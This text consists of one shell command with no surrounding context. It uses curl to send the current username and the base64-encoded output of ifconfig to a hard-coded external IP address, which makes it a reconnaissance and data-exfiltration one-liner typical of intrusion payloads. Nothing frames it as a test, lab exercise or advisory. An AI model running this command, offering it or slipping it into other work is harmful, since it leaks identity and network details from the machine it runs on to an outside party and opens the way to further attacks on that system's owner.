curl "73.76.175.200" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0)"
